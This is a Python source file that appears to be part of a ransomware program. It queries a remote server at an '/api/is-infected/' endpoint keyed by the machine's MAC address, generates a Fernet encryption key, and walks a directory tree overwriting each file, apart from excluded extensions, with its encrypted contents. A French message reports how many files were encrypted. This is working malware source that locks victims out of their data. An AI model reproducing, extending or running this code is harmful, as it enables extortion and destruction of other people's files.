from cryptography.fernet import Fernet
import os
import requests
from device_infos import get_mac_address
from dotenv import load_dotenv
from pathlib import Path


dotenv_path = Path('./.env')
load_dotenv(dotenv_path=dotenv_path)
base_api_url = os.getenv('BASE_API_URL')


class KeyGenerator:
    def keyExist(self) -> bool :
        mac_address = get_mac_address()
        response = requests.get(base_api_url + '/api/is-infected/' + mac_address)
        if response.status_code == 200:
            data = response.json()
            return data['is_infected']
        return False
        

    def generateKey(self):
        if self.keyExist() is False:
            return Fernet.generate_key()


class Encrypter:
    _fernet = ''
    _key = ''


    def __init__(self, key):
        self._key = key
        self._fernet = Fernet(self._key)
    

    def encrypt(self, path, *excludeExtensions): 
        i = 0
        for root, dirs, files in os.walk(path):
            for entry in files:
                if not entry.endswith(excludeExtensions):
                    with open(os.path.join(root, entry), 'rb') as file:
                        original = file.read()
                    encrypted = self._fernet.encrypt(original)
                    with open(os.path.join(root, entry), 'wb') as encrypted_file:
                        encrypted_file.write(encrypted)
                i += 1
        print(str(i) + ' fichiers encryptés dans le dossier : ' + path)
        return i
    